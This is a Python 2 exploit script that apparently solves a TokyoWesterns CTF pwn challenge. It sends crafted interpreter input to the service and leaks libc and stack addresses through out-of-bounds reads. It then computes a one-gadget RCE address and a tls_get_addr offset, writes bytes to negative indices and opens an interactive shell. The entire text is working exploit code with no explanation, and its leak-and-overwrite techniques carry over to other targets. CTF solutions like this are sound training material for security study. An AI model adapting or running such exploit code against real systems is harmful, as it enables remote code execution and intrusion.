import socket
import struct
import telnetlib
from hexdump import *

def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r
s = socket.create_connection(['0',1234])
#s = socket.create_connection(['pwn1.chal.ctf.westerns.tokyo',62839])
raw_input()
recvu(s,'>')
dat = ""
dat += "&&g.&&g.&&g.&&g.&&g.&&g."
dat += dat
dat +="~&&p~&&p~&&p~&&p~&&p~&&p"
dat += "\n"*24
s.send(dat+'\n')
recvu(s,'> '*24)
exit = ""
for i in range(0,6):
	s.send(str(-144+i)+'\n')
	s.send('0\n')
	exit += struct.pack('<b',int(s.recv(4),10))
libc = struct.unpack('<Q',exit+"\x00\x00")[0]-0x000000000003c1e0

prog_val = ""
for i in range(0,6):
	s.send(str(-96+i)+'\n')
	s.send('0\n')
	prog_val += struct.pack('<b',int(s.recv(4),10))
stack_val = struct.unpack('<Q',prog_val+"\x00\x00")[0]+0x7e0
print "libc : "+hex(libc)
print "stack_val :"+hex(stack_val)
magic = libc + 0x4647C
tls_get_addr = libc + 0x03BE038
print "RCE :"+hex(magic)
print "tls_get_addr :"+hex(tls_get_addr)
offset = stack_val-tls_get_addr
r = struct.pack('<q',offset)
for i in range(0,8):
	s.send(str(-21-i)+'\n')
	s.send('0\n')
	s.send(r[-i-1:-i]+'\n')
print "**** interact ****"
t = telnetlib.Telnet()
t.sock = s
t.interact()
